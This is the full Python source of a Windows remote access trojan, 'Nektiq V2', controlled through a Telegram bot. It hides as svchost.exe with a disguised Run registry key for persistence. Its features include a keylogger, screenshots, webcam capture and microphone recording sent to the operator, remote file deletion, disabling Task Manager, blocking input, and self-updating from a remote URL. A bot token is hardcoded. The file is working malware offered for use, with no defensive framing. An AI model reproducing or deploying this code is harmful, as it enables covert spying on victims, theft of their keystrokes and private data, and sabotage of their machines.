#!/usr/bin/env pythonw
# -*- coding: utf-8 -*-
"""
Name: Nektiq V2
Author: Nektiq Team
Stealthy Rat for Windows PC controlled via Telegram Bot with expanded “hacker,” “trolling,”
and persistence/update functions, now including:
 - Keyboard blocking (for a specified duration)
 - Self-uninstallation (removes bot file and registry entry)
 - Enhanced Random Mouse movement (accepts duration and intensity)
 - “Hardcore” Random Popup and Popup Storm (opens various common Windows apps and custom dialogs)
 - Additional trolling functions: Disable Task Manager, Hide/Show Taskbar
Dependencies (install via pip before running):
    pip install python-telegram-bot==13.15 pynput pillow opencv-python pywin32 pyautogui pyttsx3 requests sounddevice scipy
Replace 'YOUR_TELEGRAM_BOT_TOKEN_HERE' with your actual bot token.
Replace UPDATE_URL with a valid URL where the latest script version can be downloaded.
"""

import os
import sys
import threading
import tempfile
import time
import ctypes
import subprocess
import random
import webbrowser
import shutil
import requests
import winreg
import sounddevice as sd
import scipy.io.wavfile as wavfile

from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Third-party libraries for various functionality
from pynput import keyboard as pynput_keyboard
from PIL import ImageGrab
import cv2
import pyautogui
import win32api
import win32con
import pyttsx3  # TTS

#############################################
#                CONFIGURATION              #
#############################################

# Telegram bot token (hardcoded per request)
TELEGRAM_BOT_TOKEN = "8042264065:AAGPwSHD_4_f3Ct6LD59zzl-Zh_2oWc3q8A"

# URL to fetch updated script from
UPDATE_URL = "http://example.com/rat_bot_latest.py"

# Target install paths for persistence
APPDATA_DIR = os.getenv("APPDATA")
INSTALL_DIR = os.path.join(APPDATA_DIR, "Microsoft", "svchost")
INSTALL_EXE_NAME = "svchost.exe"  # disguising as system process
INSTALL_PATH = os.path.join(INSTALL_DIR, INSTALL_EXE_NAME)

# Keylogger global variables
KEYLOG_FILE = os.path.join(tempfile.gettempdir(), "rat_keylog.txt")
keylog_listener = None
keylogger_running = False
keylog_lock = threading.Lock()

# Audio-record global variables
AUDIO_FILE = os.path.join(tempfile.gettempdir(), "rat_audio.wav")
audio_recording = False
audio_record_lock = threading.Lock()

# Keyboard blocking flag
keyboard_blocked = False

#############################################
#             PERSISTENCE & STEALTH         #
#############################################

def is_installed() -> bool:
    """Check if the script is already installed in the target INSTALL_PATH."""
    return os.path.abspath(sys.argv[0]) == os.path.abspath(INSTALL_PATH)

def install_persistence():
    """
    Copy the running script to INSTALL_PATH, set hidden attributes, create
    Run registry key for auto-start on login, then relaunch from new location and exit.
    """
    try:
        # Create install directory if it doesn't exist
        if not os.path.isdir(INSTALL_DIR):
            os.makedirs(INSTALL_DIR, exist_ok=True)

        # Copy self to INSTALL_PATH
        shutil.copy2(sys.argv[0], INSTALL_PATH)

        # Set hidden and system attributes on the copied file and its folder
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x02 | 0x04)      # HIDDEN | SYSTEM
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, 0x02 | 0x04)     # HIDDEN | SYSTEM

        # Create or open registry Run key under HKCU to auto-start at login
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(reg_key, "Windows Update Service", 0, winreg.REG_SZ, INSTALL_PATH)
        winreg.CloseKey(reg_key)

        # Relaunch from INSTALL_PATH using pythonw (to hide console)
        subprocess.Popen(["pythonw", INSTALL_PATH], shell=False)
    except Exception:
        pass
    finally:
        # Exit current instance
        os._exit(0)

#############################################
#             KEYLOGGER FUNCTIONS           #
#############################################

def _on_press(key):
    """Internal callback: log pressed keys to file."""
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"
    with keylog_lock:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now().isoformat()} - {k}\n")

def start_keylogger():
    """Start the background keylogger thread."""
    global keylog_listener, keylogger_running
    if keylogger_running:
        return False
    with keylog_lock:
        with open(KEYLOG_FILE, "w", encoding="utf-8"):
            pass
    keylog_listener = pynput_keyboard.Listener(on_press=_on_press)
    keylog_listener.start()
    keylogger_running = True
    return True

def stop_keylogger():
    """Stop the background keylogger thread."""
    global keylog_listener, keylogger_running
    if not keylogger_running or keylog_listener is None:
        return False
    keylog_listener.stop()
    keylog_listener = None
    keylogger_running = False
    return True

#############################################
#        SCREENSHOT & CAMERA FUNCTIONS      #
#############################################

def take_screenshot(save_path: str) -> bool:
    """Take a screenshot of the entire screen and save to save_path."""
    try:
        img = ImageGrab.grab()
        img.save(save_path, "PNG")
        return True
    except Exception:
        return False

def take_camera_photo(save_path: str) -> bool:
    """Capture a single frame from the default webcam and save to save_path."""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return False
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        cv2.imwrite(save_path, cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
        return True
    except Exception:
        return False

#############################################
#          FILE MANAGEMENT FUNCTIONS        #
#############################################

def list_files_in_directory(path: str) -> list:
    """Return a list of files and directories in the given path."""
    try:
        return os.listdir(path)
    except Exception:
        return []

def delete_file(path: str) -> bool:
    """Delete a file at the given path."""
    try:
        if os.path.isfile(path):
            os.remove(path)
            return True
        return False
    except Exception:
        return False

#############################################
#         TROLLING & SYSTEM FUNCTIONS       #
#############################################

def show_random_popup():
    """
    Show a “hardcore” random popup:
    - Windows MessageBox with random text/title, plus randomly launch common apps.
    """
    # Launch a random app from a set
    apps = [
        ("notepad.exe", []),
        ("calc.exe", []),
        ("mspaint.exe", []),
        ("cmd.exe", ["/c", "echo Trollged! & pause"]),
        ("powershell.exe", ["-NoExit", "-Command", "Write-Host 'You got trolled!'"])
    ]
    app, args = random.choice(apps)
    try:
        subprocess.Popen([app] + args, shell=False)
    except Exception:
        pass

    # Then show a MessageBox
    titles = ["Alert!", "Surprise!", "Warning!", "Hello!", "Gotcha!", "Error"]
    messages = [
        "Your system is compromised!",
        "Why are you still here?",
        "¯\\_(ツ)_/¯",
        "Have you tried turning it off and on again?",
        "Error 0xDEADBEEF: Just kidding!",
        "You’ve been hacked!"
    ]
    title = random.choice(titles)
    msg = random.choice(messages)
    ctypes.windll.user32.MessageBoxW(0, msg, title, 0x30)

def popup_storm(count=15, delay=0.2):
    """
    Spawn multiple “hardcore” popups in quick succession:
    - Each iteration: launch random app + MessageBox.
    """
    for _ in range(count):
        threading.Thread(target=show_random_popup, daemon=True).start()
        time.sleep(delay)

def change_wallpaper(image_path: str) -> bool:
    """Change Windows wallpaper to the specified image."""
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 1 | 2)
        return True
    except Exception:
        return False

def reboot_pc():
    """Reboot the Windows PC immediately."""
    try:
        subprocess.run(["shutdown", "/r", "/t", "1"], check=True)
        return True
    except Exception:
        return False

def mute_system_volume():
    """Mute system volume (using WinAPI)."""
    try:
        for _ in range(0, 100):
            ctypes.windll.winmm.waveOutSetVolume(0, 0)
        return True
    except Exception:
        return False

def unmute_system_volume():
    """Unmute system volume (set to max)."""
    try:
        max_vol = 0xFFFF  # maximum volume for both channels
        ctypes.windll.winmm.waveOutSetVolume(0, max_vol | (max_vol << 16))
        return True
    except Exception:
        return False

def random_mouse_move_custom(duration: int, intensity: int):
    """
    Move mouse cursor to random positions based on intensity (pixel range)
    for a given duration (seconds).
    """
    end_time = time.time() + duration
    screen_width, screen_height = pyautogui.size()
    while time.time() < end_time:
        dx = random.randint(-intensity, intensity)
        dy = random.randint(-intensity, intensity)
        x, y = pyautogui.position()
        new_x = max(0, min(screen_width - 1, x + dx))
        new_y = max(0, min(screen_height - 1, y + dy))
        pyautogui.moveTo(new_x, new_y, duration=0.05)
        time.sleep(0.1)

def simulate_bsod():
    """Simulate a fake Blue Screen of Death by opening a full-screen blue window with error text."""
    import tkinter as tk

    def kill_switch(event):
        root.destroy()

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(background="blue")
    label = tk.Label(
        root,
        text=(
            "A problem has been detected and Windows has been shut down to prevent damage\n\n"
            "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED\n\n"
            "If this is the first time you’ve seen this Stop error screen,\n"
            "restart your computer. If this screen appears again, follow\n"
            "these steps:\n\nCheck to make sure any new hardware or software\n"
            "is properly installed.\n"
            "If this is a new installation, ask your\n"
            "hardware or software manufacturer for any Windows updates\n"
            "you might need.\n\nTechnical information:\n\n"
            "*** STOP: 0x0000007E (0xFFFFFFFFC0000005, 0x000000000C56789A, 0xFFFFF80002A4BEEF, 0x0000000000000000)"
        ),
        fg="white", bg="blue", font=("Consolas", 24)
    )
    label.pack(expand=True)
    root.bind("<Escape>", kill_switch)
    root.mainloop()

def text_to_speech(message: str):
    """
    Speak the given message via system TTS.
    Initialize engine inside function to ensure it works when hidden.
    """
    try:
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(message)
        engine.runAndWait()
    except Exception:
        pass

def toggle_capslock():
    """Toggle Caps Lock key state."""
    VK_CAPITAL = 0x14
    ctypes.windll.user32.keybd_event(VK_CAPITAL, 0, 0, 0)
    ctypes.windll.user32.keybd_event(VK_CAPITAL, 0, 0x0002, 0)

def block_keyboard_for(duration: int):
    """
    Block all keyboard and mouse input for a given duration (seconds).
    Uses BlockInput API (blocks both keyboard and mouse).
    """
    global keyboard_blocked
    keyboard_blocked = True
    ctypes.windll.user32.BlockInput(True)
    time.sleep(duration)
    ctypes.windll.user32.BlockInput(False)
    keyboard_blocked = False

def disable_task_manager():
    """
    Disable Task Manager by setting registry key:
    HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr = 1
    """
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg_key)
        return True
    except Exception:
        return False

def enable_task_manager():
    """
    Re-enable Task Manager by deleting that registry value.
    """
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(reg_key, "DisableTaskMgr")
        winreg.CloseKey(reg_key)
        return True
    except Exception:
        return False

def hide_taskbar():
    """
    Hide the Windows taskbar by sending a Windows message to the shell tray.
    """
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        return True
    except Exception:
        return False

def show_taskbar():
    """
    Show the Windows taskbar again.
    """
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 5)  # SW_SHOW = 5
        return True
    except Exception:
        return False

#############################################
#      AUDIO RECORDING (NEW FEATURE)        #
#############################################

def record_audio(duration: int = 5):
    """
    Record audio from microphone to WAV file AUDIO_FILE for given duration (seconds).
    """
    global audio_recording
    with audio_record_lock:
        audio_recording = True
    try:
        fs = 44100  # sampling frequency
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        wavfile.write(AUDIO_FILE, fs, recording)
    except Exception:
        pass
    finally:
        with audio_record_lock:
            audio_recording = False

#############################################
#         AUTO-UPDATE FUNCTIONS             #
#############################################

def download_update(dest_path: str) -> bool:
    """Download the latest script from UPDATE_URL to dest_path."""
    try:
        resp = requests.get(UPDATE_URL, timeout=15)
        if resp.status_code == 200:
            with open(dest_path, "wb") as f:
                f.write(resp.content)
            return True
        return False
    except Exception:
        return False

def perform_update_and_restart(update_message: Update, context: CallbackContext):
    """Telegram handler to update the bot: download new script, replace, and restart."""
    update_message.message.reply_text("🔄 Checking for updates...")
    tmp_path = os.path.join(tempfile.gettempdir(), f"rat_update_{int(time.time())}.py")
    if download_update(tmp_path):
        try:
            shutil.copy2(tmp_path, INSTALL_PATH)
            os.remove(tmp_path)
            update_message.message.reply_text("✅ Update downloaded. Restarting now...")
            subprocess.Popen(["pythonw", INSTALL_PATH], shell=False)
            os._exit(0)
        except Exception:
            update_message.message.reply_text("❌ Failed to replace the script. Update aborted.")
    else:
        update_message.message.reply_text("❌ Could not download update. Check UPDATE_URL or internet connection.")

#############################################
#            TELEGRAM BOT HANDLERS          #
#############################################

def start_bot(update: Update, context: CallbackContext):
    """/start command handler: display main menu."""
    menu_keyboard = [
        ["Keylogger Start", "Keylogger Stop", "Get Keylog File"],
        ["Screenshot", "Camera Photo", "List Files"],
        ["Delete File", "Random Popup", "Popup Storm"],
        ["Change Wallpaper", "Reboot PC", "Mute Volume"],
        ["Unmute Volume", "Random Mouse", "Block Keyboard"],
        ["Disable TM", "Enable TM", "Hide Taskbar"],
        ["Show Taskbar", "TTS Message", "Toggle CapsLock"],
        ["Record Audio", "Send Audio File", "Uninstall Bot"],
        ["Update Bot"]
    ]
    reply_markup = ReplyKeyboardMarkup(menu_keyboard, resize_keyboard=True)
    update.message.reply_text(
        "Stealthy Rat Bot Activated. Выберите опцию из меню ниже:",
        reply_markup=reply_markup
    )

def menu_handler(update: Update, context: CallbackContext):
    """Handle menu button presses and required follow-ups."""
    text = update.message.text.strip()
    msg = update

    # Keylogger controls
    if text == "Keylogger Start":
        if start_keylogger():
            msg.message.reply_text("🔑 Keylogger started.")
        else:
            msg.message.reply_text("🔑 Keylogger is already running.")
    elif text == "Keylogger Stop":
        if stop_keylogger():
            msg.message.reply_text("🛑 Keylogger stopped.")
        else:
            msg.message.reply_text("🛑 Keylogger was not running.")
    elif text == "Get Keylog File":
        if os.path.isfile(KEYLOG_FILE):
            msg.message.reply_document(open(KEYLOG_FILE, "rb"), filename="keylog.txt")
        else:
            msg.message.reply_text("📄 No keylog file found.")

    # Screenshot & Camera
    elif text == "Screenshot":
        save_path = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
        if take_screenshot(save_path):
            msg.message.reply_photo(open(save_path, "rb"))
            os.remove(save_path)
        else:
            msg.message.reply_text("📸 Screenshot failed.")
    elif text == "Camera Photo":
        save_path = os.path.join(tempfile.gettempdir(), f"camera_{int(time.time())}.jpg")
        if take_camera_photo(save_path):
            msg.message.reply_photo(open(save_path, "rb"))
            os.remove(save_path)
        else:
            msg.message.reply_text("🎥 Camera capture failed.")

    # File management
    elif text == "List Files":
        msg.message.reply_text("🗂️ Send directory path:")
        context.user_data["expecting_list_path"] = True
    elif text == "Delete File":
        msg.message.reply_text("🗑️ Send file path to delete:")
        context.user_data["expecting_delete_path"] = True

    # Popups
    elif text == "Random Popup":
        threading.Thread(target=show_random_popup, daemon=True).start()
        msg.message.reply_text("🔔 Hardcore popup triggered.")
    elif text == "Popup Storm":
        msg.message.reply_text("🌩️ Launching hardcore popup storm...")
        threading.Thread(target=popup_storm, daemon=True).start()

    # Wallpaper & Reboot
    elif text == "Change Wallpaper":
        msg.message.reply_text("🖼️ Send image file (as document) to set as wallpaper.")
        context.user_data["expecting_wallpaper_file"] = True
    elif text == "Reboot PC":
        msg.message.reply_text("🔄 Rebooting PC now...")
        threading.Thread(target=reboot_pc, daemon=True).start()

    # Volume
    elif text == "Mute Volume":
        if mute_system_volume():
            msg.message.reply_text("🔇 Volume muted.")
        else:
            msg.message.reply_text("❌ Failed to mute volume.")
    elif text == "Unmute Volume":
        if unmute_system_volume():
            msg.message.reply_text("🔊 Volume unmuted.")
        else:
            msg.message.reply_text("❌ Failed to unmute volume.")

    # Random Mouse (ask for duration and intensity)
    elif text == "Random Mouse":
        msg.message.reply_text("🖱️ Enter duration (sec) and intensity (0–500) separated by space.")
        context.user_data["expecting_mouse_params"] = True

    # Block Keyboard (ask for duration)
    elif text == "Block Keyboard":
        msg.message.reply_text("⌨️ Enter duration (sec) to block keyboard & mouse:")
        context.user_data["expecting_block_duration"] = True

    # Task Manager toggle
    elif text == "Disable TM":
        if disable_task_manager():
            msg.message.reply_text("❌ Task Manager disabled.")
        else:
            msg.message.reply_text("❌ Failed to disable Task Manager.")
    elif text == "Enable TM":
        if enable_task_manager():
            msg.message.reply_text("✅ Task Manager enabled.")
        else:
            msg.message.reply_text("❌ Failed to enable Task Manager.")

    # Taskbar show/hide
    elif text == "Hide Taskbar":
        if hide_taskbar():
            msg.message.reply_text("📉 Taskbar hidden.")
        else:
            msg.message.reply_text("❌ Failed to hide taskbar.")
    elif text == "Show Taskbar":
        if show_taskbar():
            msg.message.reply_text("📈 Taskbar shown.")
        else:
            msg.message.reply_text("❌ Failed to show taskbar.")

    # TTS Message
    elif text == "TTS Message":
        msg.message.reply_text("🗣️ Send message to speak aloud:")
        context.user_data["expecting_tts_text"] = True

    # CapsLock toggle
    elif text == "Toggle CapsLock":
        toggle_capslock()
        msg.message.reply_text("🔠 CapsLock toggled.")

    # Audio recording
    elif text == "Record Audio":
        msg.message.reply_text("🎙️ Recording 5 seconds of mic audio...")
        threading.Thread(target=record_audio, args=(5,), daemon=True).start()
    elif text == "Send Audio File":
        if os.path.isfile(AUDIO_FILE):
            msg.message.reply_audio(open(AUDIO_FILE, "rb"), filename="audio_recording.wav")
        else:
            msg.message.reply_text("❌ No audio file found. Use ‘Record Audio’ first.")

    # Uninstall Bot
    elif text == "Uninstall Bot":
        msg.message.reply_text("🗑️ Uninstalling bot now...")
        threading.Thread(target=uninstall_bot, daemon=True).start()

    # Update Bot
    elif text == "Update Bot":
        threading.Thread(
            target=perform_update_and_restart,
            args=(update, context),
            daemon=True
        ).start()

    else:
        # Handle follow-up inputs
        if context.user_data.get("expecting_list_path"):
            path = text
            context.user_data["expecting_list_path"] = False
            items = list_files_in_directory(path)
            if items:
                response = f"📂 Contents of '{path}':\n" + "\n".join(items)
            else:
                response = f"❌ Could not list directory or it's empty: '{path}'."
            msg.message.reply_text(response)

        elif context.user_data.get("expecting_delete_path"):
            path = text
            context.user_data["expecting_delete_path"] = False
            if delete_file(path):
                msg.message.reply_text(f"✅ File '{path}' deleted.")
            else:
                msg.message.reply_text(f"❌ Could not delete file: '{path}'. Check path and permissions.")

        elif context.user_data.get("expecting_wallpaper_file"):
            file = update.message.document
            filename = f"wallpaper_{int(time.time())}_{file.file_name}"
            save_path = os.path.join(tempfile.gettempdir(), filename)
            file.get_file().download(custom_path=save_path)
            success = change_wallpaper(save_path)
            if success:
                msg.message.reply_text("✅ Wallpaper changed.")
            else:
                msg.message.reply_text("❌ Failed to change wallpaper.")
            context.user_data["expecting_wallpaper_file"] = False

        elif context.user_data.get("expecting_mouse_params"):
            parts = text.split()
            context.user_data["expecting_mouse_params"] = False
            try:
                duration = int(parts[0])
                intensity = int(parts[1])
                msg.message.reply_text(f"🖱️ Moving mouse for {duration}s with intensity {intensity}.")
                threading.Thread(target=random_mouse_move_custom, args=(duration, intensity), daemon=True).start()
            except Exception:
                msg.message.reply_text("❌ Invalid parameters. Send two integers: duration intensity.")

        elif context.user_data.get("expecting_block_duration"):
            try:
                duration = int(text)
                context.user_data["expecting_block_duration"] = False
                msg.message.reply_text(f"⌨️ Blocking input for {duration} seconds.")
                threading.Thread(target=block_keyboard_for, args=(duration,), daemon=True).start()
            except Exception:
                msg.message.reply_text("❌ Invalid duration. Send an integer (seconds).")

        elif context.user_data.get("expecting_tts_text"):
            message_to_speak = text
            context.user_data["expecting_tts_text"] = False
            threading.Thread(target=text_to_speech, args=(message_to_speak,), daemon=True).start()
            msg.message.reply_text(f"🗣️ Speaking: \"{message_to_speak}\"")

        else:
            msg.message.reply_text("❓ Unknown command. Use /start to see the menu.")

def handle_document(update: Update, context: CallbackContext):
    """Handle files sent by the user (for Change Wallpaper)."""
    if context.user_data.get("expecting_wallpaper_file"):
        file = update.message.document
        filename = f"wallpaper_{int(time.time())}_{file.file_name}"
        save_path = os.path.join(tempfile.gettempdir(), filename)
        file.get_file().download(custom_path=save_path)
        success = change_wallpaper(save_path)
        if success:
            update.message.reply_text("✅ Wallpaper changed.")
        else:
            update.message.reply_text("❌ Failed to change wallpaper.")
        context.user_data["expecting_wallpaper_file"] = False
    else:
        update.message.reply_text("⚠️ Unexpected file. Use options from /start menu.")

def uninstall_bot():
    """
    Remove registry Run entry and delete the bot file (INSTALL_PATH),
    then exit. Uses a temporary batch file to delete the executable after exit.
    """
    # Remove registry entry
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(reg_key, "Windows Update Service")
        winreg.CloseKey(reg_key)
    except Exception:
        pass

    # Prepare a batch script to delete the executable after exit
    try:
        bat_path = os.path.join(tempfile.gettempdir(), "uninstall_rat.bat")
        with open(bat_path, "w", encoding="utf-8") as bat:
            bat.write(f"""@echo off
ping 127.0.0.1 -n 2 > nul
del "{INSTALL_PATH}" /f /q
rmdir "{INSTALL_DIR}" /s /q
del "%~f0" /f /q
""")
        # Launch batch and exit
        subprocess.Popen(["cmd.exe", "/c", bat_path], shell=False)
    except Exception:
        pass
    finally:
        os._exit(0)

def unknown(update: Update, context: CallbackContext):
    """Catch-all for unknown commands."""
    update.message.reply_text("❓ Unknown command. Use /start to see options.")

#############################################
#                   MAIN                    #
#############################################

def main():
    # If not installed, install to persistent location and re-launch
    if not is_installed():
        install_persistence()

    # Running from INSTALL_PATH now
    updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Handlers
    dispatcher.add_handler(CommandHandler("start", start_bot))
    dispatcher.add_handler(CommandHandler("update", perform_update_and_restart))
    dispatcher.add_handler(MessageHandler(Filters.document, handle_document))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, menu_handler))
    dispatcher.add_handler(MessageHandler(Filters.command, unknown))

    # Start the Bot (long polling)
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
